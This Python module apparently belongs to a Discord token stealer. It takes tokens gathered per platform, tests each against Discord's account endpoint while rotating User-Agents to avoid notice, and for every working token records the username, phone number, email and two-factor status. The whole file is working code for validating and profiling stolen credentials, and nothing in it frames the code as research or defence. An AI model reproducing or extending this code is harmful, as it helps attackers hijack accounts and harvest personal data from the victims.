from useragent.getRandomUseragent import getRandomUseragent
import json
import requests

def getTokenInformation(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': getRandomUseragent()
    }

    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)

    if r.status_code == 200:
        return {
            'data': {
                'userName': r.json()['username'] + '#' + r.json()['discriminator'],
                'phone': r.json()['phone'],
                'email': r.json()['email'],
                'mfa': r.json()['mfa_enabled']
            },
            'failed': False,
            'statuscode': r.status_code,
        }
    else:
        return {
            'data': [],
            'failed': True,
            'statuscode': r.status_code,
        }

def checkTokens(data, getJson):
    working = []

    for platform in data['tokens'].items():
        platform = platform[1]
        if not platform['found']:
            continue

        for token in platform['tokens']:
            tokenData = getTokenInformation(token)
            if not tokenData['failed']:
                working.append({
                    'information': tokenData,
                    'token': token
                })

    if getJson:
        return json.dumps({'tokens': working})
    else:
        return {'tokens': working}